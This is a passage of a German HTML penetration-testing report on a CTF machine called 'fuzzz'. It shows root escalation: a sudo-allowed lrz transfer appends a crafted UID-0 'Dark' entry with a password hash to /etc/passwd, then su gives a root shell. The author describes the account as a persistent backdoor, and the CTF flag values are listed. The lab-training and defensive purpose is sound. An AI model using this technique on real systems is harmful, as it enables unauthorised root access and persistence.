+            <strong>Analyse:</strong> Ich habe die <code>/tmp/passwd</code> Datei auf meinem Kali-System so korrigiert, dass der Eintrag f&uuml;r den &#x27;Dark&#x27;-Benutzer nun &#x27;/bin/sh&#x27; als Shell enth&auml;lt (anstelle von &#x27;/bin/bash&#x27;). Der Befehl <code>cat /tmp/passwd</code> zeigt den korrigierten Inhalt mit der Zeile <code>Dark:...:/root:/bin/sh</code>. Anschlie&szlig;end habe ich den Prozess des Hochladens und Anh&auml;ngens dieser korrigierten Datei an <code>/etc/passwd</code> auf dem Zielsystem wiederholt, wiederum &uuml;ber einen neuen <code>sudo /usr/local/bin/lrz --tcp-server</code> Prozess und meinen <code>sz --tcp-client ... --append /tmp/passwd</code> Befehl.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Die Korrektur in <code>/etc/passwd</code> und die erneute &Uuml;bertragung waren notwendig, um die Root-Anmeldung zu erm&ouml;glichen. Der Prozess verlief reibungslos, da die Methode des Datei-Anh&auml;ngens &uuml;ber <code>lrz</code>/<code>sz</code> bereits erfolgreich getestet und verwendet wurde. Ich bin nun zuversichtlich, dass der &#x27;Dark&#x27;-Benutzer mit g&uuml;ltiger Shell existiert.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe Dateiinhalte nach &Auml;nderungen sorgf&auml;ltig, bevor du sie anwendest, insbesondere wenn dies kritische Systemdateien betrifft. Nutze bereits erfolgreiche Methoden erneut, anstatt neue zu suchen.
+            <br><strong>Empfehlung (Admin):</strong> Protokolliere alle Datei&auml;nderungen an <code>/etc/passwd</code> und <code>/etc/shadow</code> und richte sofortige Alarme daf&uuml;r ein. &Uuml;berpr&uuml;fe die Integrit&auml;t dieser Dateien regelm&auml;&szlig;ig.
+        </p>
+        <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">cat /tmp/passwd</span>                                     
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">fuzzz:/etc$ cat /etc/passwd</span>
+<span class="command">root:x:0:0:root:/root:/bin/sh</span>
+....
+...
+..
+<span class="command">Dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/sh</span>
+</pre></div>
+            </div>
+         <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">connect with lrz --tcp-client &quot;fuzzz.hmv:33721&quot;</span>
+</pre></div>
+            </div>
+         <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">sz --tcp-client fuzzz.hmv:33721 --append /tmp/passwd</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">connecting to [fuzzz.hmv] &lt;33721&gt;</span>
+</pre></div>
+            </div>
+         <p class="analysis">
+            <strong>Analyse:</strong> Nach der Korrektur und dem erneuten Hochladen der <code>/etc/passwd</code> Datei, die nun den &#x27;Dark&#x27;-Benutzer mit der Shell &#x27;/bin/sh&#x27; enth&auml;lt, habe ich den <code>su Dark</code> Befehl erneut ausgef&uuml;hrt. Diesmal wurde ich erfolgreich nach dem Passwort gefragt. Nach Eingabe des korrekten Passworts (dessen Hash ich in die Datei eingef&uuml;gt hatte) erhielt ich eine neue Shell. Der Prompt wechselte zu &#x27;/etc #&#x27;, was darauf hindeutet, dass ich mich im <code>/etc</code>-Verzeichnis befinde (wahrscheinlich, weil der <code>lrz</code>-Prozess von dort gestartet wurde). Ich best&auml;tigte meine Identit&auml;t sofort mit dem <code>id</code> Befehl. Die Ausgabe <code>uid=0(root) gid=0(root) groups=0(root)</code> ist der ultimative Beweis: Ich bin erfolgreich zum Root-Benutzer eskaliert!
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich! Ich habe mein Ziel erreicht. Die Ausnutzung der fehlerhaften sudo-Berechtigung f&uuml;r <code>lrz</code>, kombiniert mit der F&auml;higkeit, <code>/etc/passwd</code> zu manipulieren, hat mir die volle Kontrolle &uuml;ber das System verschafft. Der neu erstellte &#x27;Dark&#x27;-Benutzer dient als persistente Root-Backdoor. Dieses Ergebnis unterstreicht die kritische Natur von Fehlkonfigurationen bei Berechtigungen und unzureichend gesch&uuml;tzten Systemdateien.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Wenn du die M&ouml;glichkeit hast, <code>/etc/passwd</code> oder <code>/etc/shadow</code> zu &auml;ndern, nutze dies, um einen eigenen Root-Account anzulegen. Dies ist oft die zuverl&auml;ssigste Methode zur Erlangung persistenter Root-Rechte. Best&auml;tige den Root-Zugriff immer mit <code>id</code> oder <code>whoami</code>.
+            <br><strong>Empfehlung (Admin):</strong> &Uuml;berpr&uuml;fe und h&auml;rte dein System gegen die Modifikation kritischer Systemdateien. Implementiere strikte Zugriffskontrollen. Nutze Intrusion Detection Systeme, die ungew&ouml;hnliche Login-Versuche (z.B. &uuml;ber neu erstellte Accounts) oder die Nutzung von <code>su</code> zu Root-Accounts protokollieren.
+        </p>
+        <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ grep dark -i /etc/passwd</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">Dark:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/sh</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">fuzzz:/etc$ su Dark</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+Password: 
+<span class="password">/etc # id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre></div>
+            </div>
+
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+            <!-- Hier die Flags einfügen -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+<div class="flag-command">cat /home/asahi/user.flag</div>
+<div class="flag-value"><span class="password">flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}</span></div>
+                </div>
+
+                <div class="flag-entry">
+<div class="flag-command">cat /root/root.flag</div>
+<div class="flag-value"><span class="password">flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}</span></div>
+                </div>
+            </div>
+        </section>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 04. Juli 2025</p>
+    </footer>
+</body>
+</html> 
